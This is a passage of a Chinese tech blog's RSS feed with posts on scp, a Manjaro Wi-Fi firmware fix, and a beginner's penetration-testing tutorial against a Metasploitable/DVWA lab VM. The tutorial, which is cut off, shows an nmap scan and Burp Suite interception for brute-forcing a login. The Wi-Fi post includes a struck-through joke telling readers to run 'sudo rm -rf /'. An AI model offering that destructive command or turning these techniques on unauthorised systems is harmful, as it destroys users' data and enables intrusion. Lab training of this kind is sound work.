</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;文件内容&#34;</span> <span class="o">+</span> <span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;文件内容&#34;</span> <span class="o">+</span> <span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sign</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">filecrt</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileread</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">filedel</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">filewrt</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileread</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">filedel</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>scp 命令小结</title>
    <link>http://weepingdogel.github.io/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/</link>
    <pubDate>Sat, 05 Sep 2020 12:10:07 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/scp%E5%91%BD%E4%BB%A4%E5%B0%8F%E7%BB%93/</guid>
    <description><![CDATA[<h2 id="scp-命令是什么">scp 命令是什么</h2>
<p>是传文件用的..</p>
<p>我们用 <code>ssh</code> 操作服务器，当我们需要给服务器传输文件的时候，<code>scp</code> 命令会通过 <code>ssh</code> 的端口进行文件传输。</p>
<h2 id="用法">用法</h2>
<p>当我们在终端输入 <code>scp</code> 后，我们会得到这些</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; scp
</span></span><span class="line"><span class="cl">usage: scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
</span></span><span class="line"><span class="cl">            [-J destination] [-l limit] [-o ssh_option] [-P port]
</span></span><span class="line"><span class="cl">            [-S program] source ... target
</span></span></code></pre></td></tr></table>
</div>
</div><p>很显然我们很快就知道了一些参数&hellip;</p>
<h2 id="示例">示例</h2>
<p>这里举一些例子，来展示清楚具体的使用方法&hellip;</p>
<p>先说明一下我的测试环境</p>
<blockquote>
<p>Arch Linux</p>
<p>IP: 192.168.0.105</p>
<p>CentOS8 虚拟机</p>
<p>IP: 192.168.0.108</p>
</blockquote>
<h3 id="上传一个文件">上传一个文件</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ scp [本地文件名] 用户名@地址:[文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>这是一般用法，但是<strong>请确保路径正确！</strong></p>
<p>即：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~ [1]&gt; scp ./编译/7.1.0.zip root@192.168.0.108:/root/
</span></span><span class="line"><span class="cl">root@192.168.0.108&#39;s password: 
</span></span><span class="line"><span class="cl">7.1.0.zip                                                    100%   95KB   5.2MB/s   00:00 
</span></span></code></pre></td></tr></table>
</div>
</div><p>这个很简单的，没什么多说的了..</p>
<h3 id="下载一个文件">下载一个文件</h3>
<p>如果我们要从服务器里取一个文件下来修改，而服务器没有 <code>ftp</code> 时该怎么办呢？</p>
<p>我们需要用 SSH 去找到这个文件的位置，不过这个就不详写了，与主题无关。（总之你知道文件的位置就可以了）</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ scp 用户名@地址:[文件名] [本地文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>还是要提醒一下，这个<strong>文件名</strong>， <strong>是一个路径！</strong></p>
<p>是一个<strong>相对路径</strong>或<strong>绝对路径</strong>！具体依情况而定，但<strong>它一定是个路径！</strong></p>
<p>如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; scp root@192.168.0.108:/root/index.html /tmp/index.html
</span></span><span class="line"><span class="cl">root@192.168.0.108&#39;s password: 
</span></span><span class="line"><span class="cl">index.html                                                   100%   46KB 728.6KB/s   00:00
</span></span><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; ls /tmp/*.html -lh
</span></span><span class="line"><span class="cl">-rw-r--r-- 1 weepingdogel weepingdogel 47K  9月  5 20:54 /tmp/index.html
</span></span></code></pre></td></tr></table>
</div>
</div><p>只需要知道文件在服务器的具体位置以及想好保存到本地的一个位置就可以了</p>
<h3 id="指定一个-ip">指定一个 IP</h3>
<p>一般情况下 SSH 的端口都是 22，那是真的云服务器或者一些有公网 IP 的服务器。</p>
<p>而上文写的是基于局域网中的文件传输，我们需要内网穿透才能远程文件传输，但内网穿透在一般情况下都是指定一个别的端口来给 SSH 建立一个通道，因此端口就不再是 22 了。</p>
<p>我这里用的是 <a href="https://www.natfrp.com/" target="_blank" rel="noopener noreffer">SakuraFRP</a> ，非常好用的免费内网穿透服务！</p>
<p><strong>上传：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">scp -P [端口]  [本地文件名] 用户名@地址:[文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>下载：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">scp -P [端口] 用户名@地址:[文件名] [本地文件名]
</span></span></code></pre></td></tr></table>
</div>
</div><p>上面已经提示过很多次<strong>这个<code>[文件名]</code>是个路径了</strong>。这里就不再多废话啦。</p>
<p>嗯&hellip; 具体就是这样子的：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py
</span></span></code></pre></td></tr></table>
</div>
</div><p>但是这里我来个组合命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~ [1]&gt; scp -P 45820 root@cn-zj-dx-2.sakurafrp.com:/root/test.py /tmp/test.py &amp;&amp; cd /tmp &amp;&amp; python test.py
</span></span><span class="line"><span class="cl">The authenticity of host &#39;[cn-zj-dx-2.sakurafrp.com]:45820 ([222.186.174.33]:45820)&#39; can&#39;t be established.
</span></span><span class="line"><span class="cl">ECDSA key fingerprint is SHA256:8J1Z+I8NtPXAk7EFDwLiwu8pmwSoPLYeJM2iYnV7z5M.
</span></span><span class="line"><span class="cl">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span><span class="line"><span class="cl">Warning: Permanently added &#39;[cn-zj-dx-2.sakurafrp.com]:45820,[222.186.174.33]:45820&#39; (ECDSA) to the list of known hosts.
</span></span><span class="line"><span class="cl">root@cn-zj-dx-2.sakurafrp.com&#39;s password: 
</span></span><span class="line"><span class="cl">test.py                                                      100%   21     0.2KB/s   00:00    
</span></span><span class="line"><span class="cl">Hello World
</span></span></code></pre></td></tr></table>
</div>
</div><p>上传的也是差不多的啦，把位置反过来就可以了，这里就不多演示啦</p>
<p>写完啦！</p>
<h2 id="参考链接">参考链接</h2>
<p>啥？这次没有，自己试出来的&hellip;</p>
<p>唔啊！准确来说也有，那就是各种搜索引擎啦～</p>
]]></description>
</item><item>
    <title>如何解决 Manjaro 中 QCA6174 网卡问题</title>
    <link>http://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/</link>
    <pubDate>Fri, 17 Jul 2020 10:30:59 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3manjaro%E4%B8%ADqca6174%E7%BD%91%E5%8D%A1%E9%97%AE%E9%A2%98/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/img/photo_2020-07-16_23-54-59.jpg" referrerpolicy="no-referrer">
            </div><h2 id="开场白">开场白</h2>
<p>尝试在 Redmibook 14 中安装了 Manjaro, 装完发现 WIFI 不能用</p>
<p>此时陷入了疑惑, 难道 Manjaro 也不自带 linux-firmware ?</p>
<p>总之经过了一系列折腾, 最后还是解决了, 写篇东西来记录一下解决的过程</p>
<h2 id="尝试使用其他方法连接网络">尝试使用其他方法连接网络</h2>
<p>既然 WIFI 不能用, 那也要想别的办法联网, 不然这问题就很棘手了</p>
<p>我能想到的是插网线, 可这是轻薄本, 没有有限网卡, 那么我们还有一种办法, 使用手机的 USB 网络共享</p>
<p>这个过程很简单, 按照以下步骤走</p>
<ol>
<li>
<p><strong>使用 USB 数据线将电脑与手机连接, 并打开 USB 网络共享</strong></p>
<ul>
<li><del>这个都不会的, 可以执行 <code>sudo rm -rf /</code></del></li>
<li><del>这智商, 玩你妈的 Linux</del></li>
<li>不会的, 请<a href="https://jingyan.baidu.com/article/09ea3ede1cfbf1c0aede391d.html" target="_blank" rel="noopener noreffer">参考这里</a></li>
</ul>
</li>
<li>
<p><strong>打开终端, 执行</strong></p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo ip link
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后它会返回这样的东西, 如图</p>
<p></p>
<p>设置网卡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo ip link set enp3s0f4u2 up
</span></span></code></pre></td></tr></table>
</div>
</div><p>运行 <code>dhcpcd</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo dhcpcd
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来, 我试着运行 <code>ifconfig</code>, 可是不能用, 但是看了一眼 <code>network manager</code></p>
<p>嗯 能上网了</p>
<p></p>
<h2 id="解决过程">解决过程</h2>
<h3 id="软件源">软件源</h3>
<p>我们会进行软件包的装卸, 所以我们首先需要做的是选择合适的软件源&hellip;.</p>
<p>ok, 现在我们需要修改的文件是这个</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">/etc/pacman.d/mirrorlist
</span></span></code></pre></td></tr></table>
</div>
</div><p>我们用 <code>nano</code> 改, 记得加 <code>sudo</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo nano /etc/pacman.d/mirrorlist
</span></span></code></pre></td></tr></table>
</div>
</div><p>将 <code># China</code> 下面的内容 放到第一行</p>
<p>至于 <code>nano</code> 的用法, 请自行查找资料, 会用记事本就会用这个</p>
<p>修改完后, 如图</p>
<p></p>
<p>然后执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -Sy
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装-linux-firmware">安装 <code>linux-firmware</code></h3>
<p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo pacman -S linux-firmware
</span></span></code></pre></td></tr></table>
</div>
</div><p>重启之后, 发现还是无效, 此时我去谷歌查了一下.</p>
<p>发现, 我们需要手动从 <a href="https://github.com/FireWalkerX/ath10k-firmware/tree/master/QCA6174/hw3.0" target="_blank" rel="noopener noreffer">Github</a> 下载它的驱动文件</p>
<h3 id="手动替换驱动文件">手动替换驱动文件</h3>
<p>到上面那个链接指向的 Github 仓库, 下载 <code>board-2.bin</code> 和 <code>firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1</code>, 分别将它们重命名为: <code>board.bin</code> 和 <code>firmware-4.bin</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/board-2.bin
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ wget https://github.com/FireWalkerX/ath10k-firmware/raw/7e56cbb94182a2fdab110cf5bfeded8fd1d44d30/QCA6174/hw3.0/firmware-4.bin_WLAN.RM.2.0-00180-QCARMSWPZ-1
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后把这两个文件复制到 <code>/lib/firmware/ath10k/QCA6174/hw3.0/</code> 目录下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo cp board.bin /lib/firmware/ath10k/QCA6174/hw3.0/board.bin
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">$ sudo cp firmware-4.bin /lib/firmware/ath10k/QCA6174/hw3.0/firmware-4.bin
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后重启系统, WIFI 就能用了.</p>
<p></p>
<h2 id="总结">总结</h2>
<p>以上内容均为 Redmibook 14 的解决过程, 并不一定适用于其他设备, 因此仅供参考.</p>
]]></description>
</item><item>
    <title>锏幕 新人四项考核教程</title>
    <link>http://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/</link>
    <pubDate>Sun, 20 Oct 2019 23:44:37 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E9%94%8F%E5%B9%95-%E6%96%B0%E4%BA%BA%E5%9B%9B%E9%A1%B9%E8%80%83%E6%A0%B8%E6%95%99%E7%A8%8B/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-6ql7el.jpg" referrerpolicy="no-referrer">
            </div><p><strong>注意事项：本期内容中的IP地址可能与你的实际情况不同！！请根据实际情况更改对应IP地址！！</strong></p>
<h2 id="开场白">开场白</h2>
<p>诶嘿～！我又回来了，我看到很多萌新不知道怎么过锏幕的新人考核，特意为此写篇博客做个教程。</p>
<p>好让你们看完过一下，那么…</p>
<p>嘛.. 我们开始吧..</p>
<h2 id="考核内容">考核内容</h2>
<table>
<thead>
<tr>
<th style="text-align:center">类型</th>
<th style="text-align:left">内容</th>
<th style="text-align:left">备注</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">名称</td>
<td style="text-align:left">锏幕四项萌新考核</td>
<td style="text-align:left">考核的名称</td>
</tr>
<tr>
<td style="text-align:center">难度</td>
<td style="text-align:left">Low</td>
<td style="text-align:left">难度系数</td>
</tr>
<tr>
<td style="text-align:center">第一关</td>
<td style="text-align:left">简单破解Web表单</td>
<td style="text-align:left">必须通过，否则无法进行下一关</td>
</tr>
<tr>
<td style="text-align:center">第二关</td>
<td style="text-align:left">简单SQL注入</td>
<td style="text-align:left">必须通过</td>
</tr>
<tr>
<td style="text-align:center">第三关</td>
<td style="text-align:left">操作系统渗透</td>
<td style="text-align:left">必须通过</td>
</tr>
<tr>
<td style="text-align:center">第四关</td>
<td style="text-align:left">获取root权限</td>
<td style="text-align:left">必须通过</td>
</tr>
</tbody>
</table>
<p><strong>PS：锏幕组织的新人考核是以metasploitable作为标准的，因此我会写出如何准备环境</strong></p>
<h2 id="环境准备">环境准备</h2>
<p>上面已经说明了需要用到<strong>metasploitable</strong>，那么接下来我会写出如何配置靶机环境</p>
<h3 id="第一步下载解压">第一步|下载&amp;解压</h3>
<p>首先我们需要去下载metasploitable这个靶机套餐的虚拟机文件，我们可以在各种搜索引擎中找到它我这里会给出地址。</p>
<p><a href="https://sourceforge.net/projects/metasploitable/" target="_blank" rel="noopener noreffer">点击这里可以下载</a></p>
<p>点进去以后点击那个巨大的<strong>Download</strong>即可下载。</p>
<p>嘛..我已经下载好了，是个<strong>zip</strong>文件。</p>
<p>然后你需要解压，两种方法:</p>
<ul>
<li>Linux
<ul>
<li>unzip命令</li>
<li>file-roller(GUI)</li>
</ul>
</li>
<li>Windows
<ul>
<li>各种解压软件</li>
</ul>
</li>
</ul>
<p>这个不用多说吧..</p>
<p><strong>解压个东西都不会还想加入锏幕?</strong></p>
<p></p>
<p>解压完了就可以进行下一步了。</p>
<h3 id="第二步创建虚拟机">第二步|创建虚拟机</h3>
<p>你打开文件夹就可以看到这里面有个虚拟机配置文件和一个虚拟硬盘文件，它可以直接用VMware导入运行，因此我这里给出VirtualBox的方法</p>
<p>首先，打开你的VirtualBox</p>
<p></p>
<p>然后点击上面的新建…(这个还要教吗?)</p>
<p></p>
<p>然后选择的虚拟机类型和操作系统版本，<strong>这里要注意！！必须选“64位的其他Linux”，并且设置至少256MB的内存！否则无法启动！</strong>
</p>
<p></p>
<p>然后这里就<strong>不用创建虚拟硬盘</strong>了，我们选择<strong>使用现有的虚拟硬盘文件</strong>。</p>
<p></p>
<p>点击这个东西，</p>
<p></p>
<p>然后点击<strong>注册</strong></p>
<p></p>
<p>找到你的<strong>metasploitable</strong>目录并且找到这个<strong>vmdk文件</strong>，这个就是虚拟硬盘文件。</p>
<p></p>
<p>点击打开，然后就会回到这个窗口，选择你刚刚注册的虚拟硬盘。</p>
<p></p>
<p>接下来就可以创建了</p>
<p></p>
<p><strong>在启动之前要把虚拟机的联网改成桥接</strong></p>
<p><strong>依次点击设置——网络</strong></p>
<p>然后就会跳出这个页面</p>
<p></p>
<p>将它改成桥接网卡即可</p>
<p></p>
<p>最后启动虚拟机，你的靶机环境就搭建完成了。

</p>
<p>开机之后<strong>不要去操作靶机</strong>也<strong>不要去理会它</strong></p>
<p></p>
<h2 id="考核过程">考核过程</h2>
<p>现在环境已经准备完毕了，我们可以开始进行过关了。接下来请<strong>认真看！认真看！认真看！</strong>（重要的事情说三遍）</p>
<h3 id="嗅探扫描">嗅探！扫描！</h3>
<p>我们刚刚搭建完靶机却不知道它的<strong>IP地址</strong>，这意味着我们不知道<strong>它的位置</strong>，那么怎么办呢？这个时候我们要用到<strong>nmap</strong>把他扫出来。</p>
<p>不过前提是首先你得知道你所处的IP段，我的环境是局域网，DHCP地址段是<code>192.168.0.1/24</code></p>
<p>执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo nmap -v -O 192.168.0.1/24
</span></span><span class="line"><span class="cl">!<span class="o">[](</span>/img/截图_2019-10-20_06-27-08.png<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以发现它很快就扫出来了</p>
<p></p>
<p>终端里获取到的信息如下，说明这个192.168.0.107就是靶机的地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Nmap scan report for 192.168.0.107
</span></span><span class="line"><span class="cl">Host is up (0.00028s latency).
</span></span><span class="line"><span class="cl">Not shown: 977 closed ports
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp   open  ftp
</span></span><span class="line"><span class="cl">22/tcp   open  ssh
</span></span><span class="line"><span class="cl">23/tcp   open  telnet
</span></span><span class="line"><span class="cl">25/tcp   open  smtp
</span></span><span class="line"><span class="cl">53/tcp   open  domain
</span></span><span class="line"><span class="cl">80/tcp   open  http
</span></span><span class="line"><span class="cl">111/tcp  open  rpcbind
</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn
</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
</span></span><span class="line"><span class="cl">512/tcp  open  exec
</span></span><span class="line"><span class="cl">513/tcp  open  login
</span></span><span class="line"><span class="cl">514/tcp  open  shell
</span></span><span class="line"><span class="cl">1099/tcp open  rmiregistry
</span></span><span class="line"><span class="cl">1524/tcp open  ingreslock
</span></span><span class="line"><span class="cl">2049/tcp open  nfs
</span></span><span class="line"><span class="cl">2121/tcp open  ccproxy-ftp
</span></span><span class="line"><span class="cl">3306/tcp open  mysql
</span></span><span class="line"><span class="cl">5432/tcp open  postgresql
</span></span><span class="line"><span class="cl">5900/tcp open  vnc
</span></span><span class="line"><span class="cl">6000/tcp open  X11
</span></span><span class="line"><span class="cl">6667/tcp open  irc
</span></span><span class="line"><span class="cl">8009/tcp open  ajp13
</span></span><span class="line"><span class="cl">8180/tcp open  unknown
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:3F:40:18 (Oracle VirtualBox virtual NIC)
</span></span><span class="line"><span class="cl">Device type: general purpose
</span></span><span class="line"><span class="cl">Running: Linux 2.6.X
</span></span><span class="line"><span class="cl">OS CPE: cpe:/o:linux:linux_kernel:2.6
</span></span><span class="line"><span class="cl">OS details: Linux 2.6.9 - 2.6.33
</span></span><span class="line"><span class="cl">Uptime guess: 0.002 days (since Sun Oct 20 06:23:17 2019)
</span></span><span class="line"><span class="cl">Network Distance: 1 hop
</span></span><span class="line"><span class="cl">TCP Sequence Prediction: Difficulty=192 (Good luck!)
</span></span><span class="line"><span class="cl">IP ID Sequence Generation: All zeros
</span></span></code></pre></td></tr></table>
</div>
</div><p>那么我已经找到靶机了，接下来就可以正式进行攻击了。</p>
<h3 id="第一关简单破解web表单">第一关|简单破解Web表单</h3>
<p>接下来我们在浏览器输入刚刚扫描到的地址，就可以进入靶机上的网页了。</p>
<p></p>
<blockquote>
<p>小白：唔？为什么你的IP不是上面写的107了，变成4了</p>
<p>回答：我写着写着就断网了，搭建了一个虚拟局域网，所以靶机IP变了，又重新扫了一遍。。但是正常情况下，这个IP是不会变的，所以请无视这个地址具体是多少了，每个人都不一样的。</p>
</blockquote>
<p>接下来我们点击<strong>DVWA</strong>，进入了一个这样的帐号密码登录页面，我们第一关的目的就是破解它。</p>
<p></p>
<p>QwQ，然后..是不是到这里就一脸懵逼了</p>
<h4 id="抓包">抓包</h4>
<p>嘛，记得<strong>Burpsuite</strong>吗？</p>
<p>就是一个java写的软件</p>
<p></p>
<p>试试？</p>
<p>在使用Burpsuite之前，你需要给浏览器设置burp的代理，我这里使用的是firefox</p>
<p>那么，在burpsuite里面依次点击</p>
<p><code>Proxy（左上角内个）——Options</code></p>
<p></p>
<p>从这里我们就获得了burp默认的代理地址<code>127.0.0.1:8080</code></p>
<p>接下来要到浏览器里设置它，</p>
<p>简单地给出截图吧</p>
<p></p>
<p></p>
<p>然后点确定，就这样设置好了</p>
<p>嘛…<strong>浏览器都不会用</strong>的也别来锏幕了</p>
<p>然后回到burp，确认一下这个<strong>Intercept</strong>是否为<strong>on</strong>，如果是就进行下一步操作，如果不是就点一下。。。</p>
<p></p>
<p>接下来，回到浏览器</p>
<p></p>
<p>emmmm….我们知道一般网站的默认管理员帐号都是<strong>admin</strong>，这里也不例外，接下来我们试着在Username这个框框里输入<code>admin</code>，<strong>Password</strong>这个框框里随便输入点什么</p>
<p></p>
<p>然后点击<strong>login</strong>。</p>
<p>接下来我们就抓取到了这个数据包了，下面还有我输入过的信息</p>
<p></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
